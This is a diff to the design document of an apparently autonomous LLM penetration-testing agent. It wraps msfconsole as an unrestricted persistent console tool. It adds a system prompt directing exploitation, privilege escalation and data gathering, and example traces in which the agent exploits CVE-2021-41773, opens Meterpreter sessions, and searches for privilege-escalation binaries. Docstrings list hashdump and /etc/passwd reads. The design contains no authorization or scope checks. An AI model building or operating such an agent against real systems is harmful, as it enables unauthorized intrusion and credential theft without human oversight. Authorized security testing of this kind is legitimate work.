@@ -180,9 +180,9 @@ volumes:
 
 MCP servers expose penetration testing tools to the AI agent. We use two approaches:
 
-1. **Dynamic CLI Wrappers** (naabu, nuclei, curl): Generic `execute` + `help` tools that accept raw CLI arguments. This maximizes flexibility since LLMs know these tools from training data.
+**Dynamic CLI Wrappers**: All tools (naabu, nuclei, curl, metasploit) use generic `execute`/`console` tools that accept raw CLI arguments. This maximizes flexibility since LLMs know these tools from training data.
 
-2. **Structured Tools** (metasploit): Specific tools for each function because Metasploit is stateful (sessions, listeners) and benefits from explicit parameter handling.
+For stateful tools like Metasploit, we use a **persistent process** via pexpect to maintain sessions, handlers, and state between calls.
 
 #### Tool Design Philosophy
 
@@ -191,7 +191,9 @@ MCP servers expose penetration testing tools to the AI agent. We use two approac
 | naabu | Dynamic (`execute` + `help`) | Simple CLI, LLM knows flags |
 | nuclei | Dynamic (`execute` + `help`) | Many templates/options, flexible |
 | curl | Dynamic (`execute` + `help`) | Countless flags, LLM expertise |
-| metasploit | Structured (7 specific tools) | Stateful, sessions, complex workflows |
+| metasploit | Dynamic (`console`) with persistent process | Stateful via pexpect, LLM knows msfconsole |
+
+**Key insight**: LLMs are trained on extensive Metasploit documentation, CTF writeups, and tutorials. Rather than constraining them with structured tools, we give them a persistent msfconsole session and let them use their knowledge directly.
 
 ---
 
@@ -391,165 +393,155 @@ if __name__ == "__main__":
 
 **mcp_servers/metasploit_server.py:**
 
-Metasploit uses structured tools because it's stateful (maintains sessions, listeners) and requires careful parameter handling for exploits.
+Metasploit uses a **persistent console** via pexpect. This maintains state (sessions, handlers, jobs) between tool calls while giving the LLM full flexibility to use any msfconsole command.
 
 ```python
 from fastmcp import FastMCP
-import subprocess
-from typing import Optional
+import pexpect
+import threading
 
 mcp = FastMCP("metasploit")
 
+class MetasploitConsole:
+    """Persistent msfconsole session with thread-safe access."""
+
+    def __init__(self):
+        self.process = None
+        self.lock = threading.Lock()
+        self._start_console()
+
+    def _start_console(self):
+        """Start or restart the msfconsole process."""
+        if self.process:
+            self.process.close()
+        self.process = pexpect.spawn('msfconsole -q', timeout=300, encoding='utf-8')
+        # Wait for initial prompt
+        self._read_until_idle()
+
+    def _read_until_idle(self, idle_timeout: float = 1.0, max_timeout: float = 120) -> str:
+        """
+        Read output until no new data arrives for idle_timeout seconds.
+
+        This is the universal approach - works with ANY prompt, ANY shell,
+        ANY context. We don't need to know what the prompt looks like,
+        we just wait until the output stops flowing.
+
+        Args:
+            idle_timeout: Seconds of silence before considering command complete
+            max_timeout: Maximum total time to wait
+
+        Returns:
+            All captured output
+        """
+        import time
+
+        output_chunks = []
+        start_time = time.time()
+
+        while True:
+            # Check total timeout
+            if time.time() - start_time > max_timeout:
+                break
+
+            try:
+                # Try to read with short timeout
+                chunk = self.process.read_nonblocking(size=4096, timeout=idle_timeout)
+                if chunk:
+                    output_chunks.append(chunk)
+                    # Reset idle timer when we get data
+                    continue
+            except pexpect.TIMEOUT:
+                # No data for idle_timeout seconds = command is done
+                break
+            except pexpect.EOF:
+                raise
+
+        return ''.join(output_chunks)
+
+    def execute(self, command: str, timeout: int = 120) -> str:
+        """
+        Execute a command and capture output using the silence-detection approach.
+
+        This works universally across ALL contexts:
+        - msfconsole prompts (msf6 >, msf6 exploit(...) >)
+        - meterpreter sessions
+        - Unix shells ($, #, user@host:~$)
+        - Windows shells (C:\>, PS C:\>)
+        - Database shells (mysql>, postgres=#)
+        - Any other interactive prompt
+
+        The approach: send command, then read until output stops flowing.
+        When no new data arrives for 1 second, the command is complete.
+        """
+        with self.lock:
+            try:
+                # Clear any pending output first
+                try:
+                    self.process.read_nonblocking(size=65536, timeout=0.1)
+                except pexpect.TIMEOUT:
+                    pass
+
+                # Send the command
+                self.process.sendline(command)
+
+                # Small delay to let command start
+                import time
+                time.sleep(0.05)
+
+                # Read until output stops (idle detection)
+                output = self._read_until_idle(idle_timeout=1.0, max_timeout=timeout)
+
+                # Clean up: remove the echoed command from the start if present
+                lines = output.strip().split('\n')
+                if lines and command in lines[0]:
+                    lines = lines[1:]
+
+                return '\n'.join(lines).strip()
+
+            except pexpect.TIMEOUT:
+                partial = self.process.before.strip() if self.process.before else ""
+                return f"{partial}\n[TIMEOUT] Command did not complete within {timeout}s"
+            except pexpect.EOF:
+                self._start_console()
+                return "[ERROR] Console crashed, restarted. Please retry."
+
+# Global persistent console instance
+console = MetasploitConsole()
+
 @mcp.tool()
-def metasploit_search(query: str) -> str:
+def metasploit_console(command: str, timeout: int = 120) -> str:
     """
-    Search for Metasploit modules (exploits, payloads, auxiliaries).
+    Execute any command in the persistent Metasploit console.
+
+    The console maintains state - sessions, handlers, and jobs persist
+    between calls. Use standard msfconsole commands.
 
     Args:
-        query: Search query (e.g., "struts", "CVE-2017-5638", "type:exploit platform:linux")
+        command: Any valid msfconsole command
+        timeout: Command timeout in seconds (default: 120)
 
     Returns:
-        List of matching modules with their ranks and descriptions
+        Command output from msfconsole
 
     Examples:
-        - "apache struts"
-        - "CVE-2017-5638"
-        - "type:exploit platform:windows smb"
-        - "type:auxiliary scanner http"
+        - "search CVE-2021-41773"
+        - "search type:exploit apache"
+        - "use exploit/multi/http/apache_normalize_path_rce"
+        - "info"
+        - "show options"
+        - "show payloads"
+        - "set RHOSTS 10.0.0.5"
+        - "set PAYLOAD linux/x64/meterpreter/reverse_tcp"
+        - "set LHOST 10.0.0.10"
+        - "set LPORT 4444"
+        - "check"
+        - "exploit" or "exploit -j" (background job)
+        - "sessions -l"
+        - "sessions -i 1"
+        - "background"
+        - (in meterpreter) "sysinfo", "getuid", "hashdump", "shell"
     """
-    cmd = ["msfconsole", "-q", "-x", f"search {query}; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_info(module_name: str) -> str:
-    """
-    Get detailed information about a Metasploit module.
-
-    Args:
-        module_name: Full module path (e.g., "exploit/multi/http/struts2_content_type_ognl")
-
-    Returns:
-        Module description, options, targets, and references
-    """
-    cmd = ["msfconsole", "-q", "-x", f"info {module_name}; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_module_payloads(module_name: str) -> str:
-    """
-    List compatible payloads for an exploit module.
-
-    Args:
-        module_name: Full exploit module path
-
-    Returns:
-        List of compatible payloads that can be used with this exploit
-    """
-    commands = f"use {module_name}; show payloads; exit"
-    cmd = ["msfconsole", "-q", "-x", commands]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_payload_info(payload_name: str) -> str:
-    """
-    Get detailed information about a payload.
-
-    Args:
-        payload_name: Full payload path (e.g., "linux/x64/meterpreter/reverse_tcp")
-
-    Returns:
-        Payload description, options (LHOST, LPORT, etc.), and platform info
-    """
-    cmd = ["msfconsole", "-q", "-x", f"info payload/{payload_name}; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_exploit(
-    module: str,
-    rhosts: str,
-    rport: int,
-    payload: str,
-    lhost: str,
-    lport: int,
-    extra_options: Optional[str] = None
-) -> str:
-    """
-    Execute a Metasploit exploit with specified payload.
-
-    Args:
-        module: Exploit module path (e.g., "multi/http/struts2_content_type_ognl")
-        rhosts: Target IP address or hostname
-        rport: Target port number
-        payload: Payload to deliver (e.g., "linux/x64/meterpreter/reverse_tcp")
-        lhost: Listener IP address (your attacking machine)
-        lport: Listener port number
-        extra_options: Additional options as "KEY=VALUE; KEY2=VALUE2" (optional)
-
-    Returns:
-        Exploit execution output including session info if successful
-    """
-    commands = f"""
-use {module}
-set RHOSTS {rhosts}
-set RPORT {rport}
-set PAYLOAD {payload}
-set LHOST {lhost}
-set LPORT {lport}
-"""
-    if extra_options:
-        for opt in extra_options.split(";"):
-            opt = opt.strip()
-            if opt:
-                commands += f"set {opt}\n"
-
-    commands += """
-exploit -j
-sleep 5
-sessions -l
-exit
-"""
-    cmd = ["msfconsole", "-q", "-x", commands]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_sessions() -> str:
-    """
-    List all active Metasploit sessions.
-
-    Returns:
-        Table of active sessions with ID, type, connection info, and target details
-    """
-    cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-    return result.stdout
-
-@mcp.tool()
-def metasploit_session_interact(session_id: int, command: str, timeout: int = 30) -> str:
-    """
-    Execute a command on an active Metasploit session.
-
-    Args:
-        session_id: Session ID from metasploit_sessions()
-        command: Command to execute (e.g., "whoami", "cat /etc/passwd", "sysinfo")
-        timeout: Command timeout in seconds (default: 30)
-
-    Returns:
-        Command output from the compromised target
-
-    Examples:
-        - session_id=1, command="whoami"
-        - session_id=1, command="cat /etc/passwd"
-        - session_id=1, command="sysinfo" (for meterpreter)
-        - session_id=1, command="hashdump" (for meterpreter with privileges)
-    """
-    cmd = ["msfconsole", "-q", "-x", f"sessions -i {session_id} -c '{command}'; exit"]
-    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 30)
-    return result.stdout
+    return console.execute(command, timeout)
 
 if __name__ == "__main__":
     mcp.run(transport="stdio")
@@ -707,35 +699,55 @@ Your goal is to find and exploit vulnerabilities on the target system.
 
 You have access to these tools:
 
-**Reconnaissance & Scanning (Dynamic CLI):**
-- execute_naabu(args): Port scanning - pass any naabu CLI arguments
-- naabu_help(): Get naabu usage information
-- execute_nuclei(args): Vulnerability scanning - pass any nuclei CLI arguments
-- nuclei_help(): Get nuclei usage information
-- execute_curl(args): HTTP requests - pass any curl CLI arguments
-- curl_help(): Get curl usage information
+**Knowledge Base (ALWAYS CHECK FIRST):**
+- query_recon_data(question): Query Neo4j graph for existing recon data
+  - Hosts, ports, services, technologies, versions
+  - Vulnerabilities (CVEs) with severity and CVSS scores
+  - CWE weaknesses and CAPEC attack patterns
+  - Timestamps of when data was collected
 
-**Knowledge Base:**
-- query_recon_data(question): Query Neo4j for existing recon data (hosts, ports, CVEs)
+**Reconnaissance & Scanning (USE ONLY IF NEEDED):**
+- execute_naabu(args): Port scanning - only if ports unknown or stale
+- execute_nuclei(args): Vulnerability scanning - only if CVEs unknown or need verification
+- execute_curl(args): HTTP requests - for manual verification or exploitation
+- *_help(): Get usage information for each tool
 
-**Exploitation (Structured Tools):**
-- metasploit_search(query): Find exploits for vulnerabilities
-- metasploit_info(module_name): Get exploit module details
-- metasploit_module_payloads(module_name): List compatible payloads
-- metasploit_payload_info(payload_name): Get payload details
-- metasploit_exploit(module, rhosts, rport, payload, lhost, lport): Execute exploits
-- metasploit_sessions(): List active sessions
-- metasploit_session_interact(session_id, command): Run commands on compromised hosts
+**Exploitation (Persistent Console):**
+- metasploit_console(command): Execute ANY msfconsole command. State persists between calls.
+  Use "help" command for reference (e.g., metasploit_console("help"))
+
+IMPORTANT WORKFLOW - Graph-First Approach:
+==========================================
+1. ALWAYS query the graph database FIRST to check what we already know
+2. ONLY run new scans (naabu, nuclei) if:
+   - No data exists for the target
+   - Data is stale (older than threshold, e.g., 24 hours)
+   - User explicitly requests fresh scan
+   - Need to verify a specific finding before exploitation
+
+Example queries to check existing data:
+- "What hosts, ports, and vulnerabilities do we know about 10.0.0.5?"
+- "Show all critical CVEs for target 10.0.0.5 with their CVSS scores"
+- "When was the last scan performed on 10.0.0.5?"
+- "What technologies are running on 10.0.0.5 port 80?"
 
 Follow this methodology:
-1. PLANNING: Query recon data to understand the target infrastructure
-2. SCANNING: Use execute_naabu to discover ports (e.g., "-host TARGET -p 1-1000 -json")
-3. ENUMERATION: Use execute_curl and execute_nuclei to find vulnerabilities
-4. EXPLOITATION: Use metasploit tools to exploit discovered vulnerabilities
-5. POST-EXPLOITATION: Use metasploit_session_interact to extract data, escalate privileges
+1. PLANNING: Query graph for existing recon data on the target
+2. ASSESS: Determine if existing data is sufficient or if new scans needed
+3. SCAN (if needed): Only scan for missing information
+4. EXPLOITATION: Use metasploit_console to exploit discovered vulnerabilities
+5. POST-EXPLOITATION: Interact with sessions, escalate privileges, gather data
+
+The metasploit_console maintains a persistent session. Use it interactively:
+  metasploit_console("search CVE-2021-41773")
+  metasploit_console("use exploit/multi/http/apache_normalize_path_rce")
+  metasploit_console("set RHOSTS 10.0.0.5")
+  metasploit_console("exploit")
+  metasploit_console("sessions -i 1")
+  metasploit_console("sysinfo")
 
 Always think step-by-step. Explain your reasoning before each action.
-If unsure about tool flags, use the _help tools to discover options.
+Avoid redundant scanning - leverage existing reconnaissance data.
 """
 
         messages = [{"role": "system", "content": system_prompt}] + state["messages"]
@@ -820,59 +832,197 @@ result = agent.run(
 
 ---
 
-## Example Agent Execution Trace
+## Example Agent Execution Traces
+
+### Scenario A: Unknown Target (No Graph Data)
 
 ```
 ┌─────────────────────────────────────────────────────────────────────────────────┐
-│ USER: Find vulnerabilities on 10.0.0.5 and attempt to exploit them             │
+│ USER: Find vulnerabilities on 10.0.0.99 and attempt to exploit them            │
 └─────────────────────────────────────────────────────────────────────────────────┘
 
-Step 1 - PLANNING
-├── Thought: I need to understand what we already know about this target from recon
-├── Tool:    query_recon_data("What do we know about host 10.0.0.5?")
-└── Response: Host has ports 22, 80, 443 open. Running Apache 2.4.49.
-              CVE-2021-41773 detected (Path Traversal, CVSS 7.5)
+Step 1 - QUERY GRAPH FIRST
+├── Thought: Let me check what we already know about this target
+├── Tool:    query_recon_data("Show all data for host 10.0.0.99 including scan timestamps")
+└── Response: No data found for host 10.0.0.99
 
-Step 2 - SCANNING (verify with fresh scan)
-├── Thought: Let me verify the open ports with a fresh scan
-├── Tool:    execute_naabu("-host 10.0.0.5 -p 1-1000 -json")
-└── Response: {"host":"10.0.0.5","port":22} {"host":"10.0.0.5","port":80} ...
+Step 2 - SCANNING REQUIRED
+├── Thought: No existing data. Must perform fresh reconnaissance.
+├── Tool:    execute_naabu("-host 10.0.0.99 -p 1-10000 -json")
+└── Response: {"host":"10.0.0.99","port":22} {"host":"10.0.0.99","port":80}
 
-Step 3 - ENUMERATION
-├── Thought: CVE-2021-41773 is a path traversal in Apache 2.4.49. Let me verify.
-├── Tool:    execute_nuclei("-u http://10.0.0.5 -severity critical,high -jsonl")
-└── Response: [CVE-2021-41773] Apache 2.4.49 Path Traversal - CONFIRMED
+Step 3 - VULNERABILITY SCANNING
+├── Thought: Found open ports. Scanning for vulnerabilities.
+├── Tool:    execute_nuclei("-u http://10.0.0.99 -severity critical,high -jsonl")
+└── Response: [CVE-2021-41773] Apache 2.4.49 Path Traversal - CRITICAL
 
-Step 4 - EXPLOITATION RESEARCH
-├── Thought: Let me search for exploits for this CVE
-├── Tool:    metasploit_search("CVE-2021-41773")
-└── Response: exploit/multi/http/apache_normalize_path_rce (Excellent)
-
-Step 5 - EXPLOITATION PREP
-├── Thought: Let me get info about this exploit and find compatible payloads
-├── Tool:    metasploit_info("exploit/multi/http/apache_normalize_path_rce")
-├── Tool:    metasploit_module_payloads("exploit/multi/http/apache_normalize_path_rce")
-└── Response: Compatible payloads: linux/x64/meterpreter/reverse_tcp, cmd/unix/reverse_bash...
-
-Step 6 - EXPLOITATION
-├── Thought: Found an RCE exploit. Configuring and launching...
-├── Tool:    metasploit_exploit(
-│                module="multi/http/apache_normalize_path_rce",
-│                rhosts="10.0.0.5", rport=80,
-│                payload="linux/x64/meterpreter/reverse_tcp",
-│                lhost="10.0.0.10", lport=4444
-│            )
-└── Response: [*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:45892)
-
-Step 7 - POST-EXPLOITATION
-├── Thought: Shell obtained. Checking current user and extracting data.
-├── Tool:    metasploit_session_interact(session_id=1, command="whoami")
-└── Response: www-data
-
-Step 8 - REPORTING
-└── Thought: Successfully exploited CVE-2021-41773 and obtained shell access as
-             www-data. The target is vulnerable to path traversal leading to RCE.
+Step 4 - EXPLOITATION
+├── Tool:    metasploit_console("search CVE-2021-41773")
+│            ... (continues with exploitation)
 ```
+
+### Scenario B: Known Target (Graph Has Fresh Data) - OPTIMIZED
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ USER: Find vulnerabilities on 10.0.0.5 and attempt to exploit them              │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+Step 1 - QUERY GRAPH
+├── Thought: Before scanning, let me check what reconnaissance data already exists
+│            for this target in the graph database.
+├── Tool:    query_recon_data("Show all ports, technologies, and CVEs for 10.0.0.5
+│                              with scan timestamps and CVSS scores")
+└── Output:
+      Host: 10.0.0.5 (scanned: 2 hours ago)
+      Ports: 22/tcp (SSH), 80/tcp (HTTP), 443/tcp (HTTPS)
+      Technology: Apache 2.4.49
+      Vulnerabilities:
+        - CVE-2021-41773 (CRITICAL, CVSS 9.8) - Path Traversal RCE
+        - CVE-2021-42013 (CRITICAL, CVSS 9.8) - Path Traversal bypass
+
+Step 2 - SEARCH EXPLOIT
+├── Thought: Fresh data exists (2 hours old). Found critical RCE vulnerability
+│            CVE-2021-41773 with CVSS 9.8. No need to rescan - searching for exploit.
+├── Tool:    metasploit_console("search CVE-2021-41773")
+└── Output:  exploit/multi/http/apache_normalize_path_rce  rank:excellent
+
+Step 3 - SELECT EXPLOIT
+├── Thought: Found matching exploit with excellent rank. Selecting it to examine
+│            its requirements and options.
+├── Tool:    metasploit_console("use exploit/multi/http/apache_normalize_path_rce")
+└── Output:  [*] Using configured payload linux/x64/meterpreter/reverse_tcp
+
+Step 4 - CHECK EXPLOIT INFO
+├── Thought: Need to understand exploit requirements before configuration.
+├── Tool:    metasploit_console("info")
+└── Output:
+      Name: Apache 2.4.49/2.4.50 - Path Traversal RCE
+      Module: exploit/multi/http/apache_normalize_path_rce
+      Platform: Linux, Unix
+      Rank: Excellent
+      Required options: RHOSTS (target), RPORT (default 80)
+
+Step 5 - LIST PAYLOADS
+├── Thought: Exploit requires RHOSTS and RPORT. Now I need to choose a payload.
+│            Using bind_tcp since our host cannot receive reverse connections.
+├── Tool:    metasploit_console("show payloads")
+└── Output:
+      Compatible Payloads:
+        linux/x64/meterpreter/bind_tcp
+        linux/x64/meterpreter/reverse_tcp
+        linux/x64/shell/bind_tcp
+        cmd/unix/reverse_bash
+        ...
+
+Step 6 - CHECK PAYLOAD INFO
+├── Thought: Selecting bind_tcp for meterpreter. Let me check its requirements.
+├── Tool:    metasploit_console("info payload/linux/x64/meterpreter/bind_tcp")
+└── Output:
+      Name: Linux Meterpreter, Bind TCP Stager
+      Platform: Linux | Arch: x64
+      Required options: LPORT (default 4444)
+      Description: Target listens on port, we connect to it.
+
+Step 7 - CONFIGURE OPTIONS
+├── Thought: Based on exploit info (needs RHOSTS, RPORT) and payload info
+│            (needs LPORT only, no LHOST for bind shells), configuring all options.
+├── Tool:    metasploit_console("set RHOSTS 10.0.0.5; set PAYLOAD linux/x64/meterpreter/bind_tcp; set LPORT 4444; show options")
+└── Output:
+      RHOSTS => 10.0.0.5
+      PAYLOAD => linux/x64/meterpreter/bind_tcp
+      LPORT => 4444
+      All required options configured.
+
+Step 8 - VERIFY VULNERABILITY
+├── Thought: All options set. Running check to verify target is vulnerable
+│            before exploitation.
+├── Tool:    metasploit_console("check")
+└── Output:  [+] 10.0.0.5:80 - The target is vulnerable.
+
+Step 9 - EXPLOIT
+├── Thought: Target confirmed vulnerable. Executing exploit.
+├── Tool:    metasploit_console("exploit")
+└── Output:
+      [*] Started bind TCP handler against 10.0.0.5:4444
+      [*] Sending stage (3045380 bytes) to 10.0.0.5
+      [*] Meterpreter session 1 opened (10.0.0.10:54321 -> 10.0.0.5:4444)
+
+Step 10 - POST-EXPLOITATION RECON
+├── Thought: Session opened! Gathering system information.
+├── Tool:    metasploit_console("sysinfo")
+└── Output:
+      Computer: webserver
+      OS: Ubuntu 20.04 (Linux 5.4.0)
+      Architecture: x64
+      Meterpreter: x64/linux
+
+Step 11 - CHECK USER CONTEXT
+├── Thought: System is Ubuntu 20.04. Checking current user privileges.
+├── Tool:    metasploit_console("getuid")
+└── Output:  Server username: www-data
+
+Step 12 - PRIVILEGE ESCALATION RECON
+├── Thought: Running as www-data (low privilege). Searching for SUID binaries
+│            that could allow privilege escalation.
+├── Tool:    metasploit_console("shell -c 'find / -perm -4000 2>/dev/null'")
+└── Output:
+      /usr/bin/sudo
+      /usr/bin/pkexec
+      /usr/bin/passwd
+      ...
+
+Step 13 - FINAL REPORT
+├── Thought: Successfully exploited CVE-2021-41773 and obtained shell as www-data.
+│            Found potential privesc vectors (sudo, pkexec).
+│            EFFICIENCY: Skipped naabu + nuclei by using graph data.
+├── Tool:    None (reporting complete)
+└── Summary:
+      Target: 10.0.0.5
+      Vulnerability: CVE-2021-41773 (CVSS 9.8)
+      Exploit: apache_normalize_path_rce
+      Access: Meterpreter session as www-data
+      Next steps: Investigate sudo/pkexec for privilege escalation
+```
+
+### Scenario C: Stale Data (Selective Rescan)
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ USER: Check 10.0.0.5 for vulnerabilities                                       │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+Step 1 - QUERY GRAPH
+├── Tool:    query_recon_data("When was 10.0.0.5 last scanned? Show CVEs and ports.")
+└── Response:
+    Host: 10.0.0.5 (scanned: 7 days ago)
+    Ports: 22, 80, 443
+    CVEs: CVE-2021-41773
+
+Step 2 - ASSESS DATA FRESHNESS
+├── Thought: Data is 7 days old. Ports unlikely to change, but new CVEs may exist.
+│            I'll run nuclei for fresh vulnerability data, skip port scanning.
+└── Decision: Run nuclei only, skip naabu
+
+Step 3 - SELECTIVE VULNERABILITY SCAN
+├── Tool:    execute_nuclei("-u http://10.0.0.5 -severity critical,high,medium -jsonl")
+└── Response: [CVE-2021-41773] confirmed
+              [CVE-2024-12345] NEW - Apache mod_proxy SSRF (CRITICAL)
+
+Step 4 - PROCEED WITH NEW FINDING
+├── Thought: Found a new critical CVE! Proceeding to exploit CVE-2024-12345.
+│            ... (continues with exploitation)
+```
+
+### Decision Matrix: When to Scan
+
+| Scenario | Naabu (Ports) | Nuclei (CVEs) | Rationale |
+|----------|---------------|---------------|-----------|
+| No data in graph | Yes | Yes | Must discover everything |
+| Fresh data (<24h) | No | No | Trust existing data |
+| Stale data (>24h) | No | Yes | Ports stable, CVEs change |
+| User requests fresh scan | Yes | Yes | Explicit override |
+| Pre-exploitation verify | No | Maybe | Use metasploit `check` instead |
 
 ---
 
@@ -888,6 +1038,7 @@ langchain-mcp>=0.1.0
 mcp>=1.0.0
 fastmcp>=0.1.0
 neo4j>=5.0.0
+pexpect>=4.8.0          # For persistent msfconsole session
 ```
 
 ---
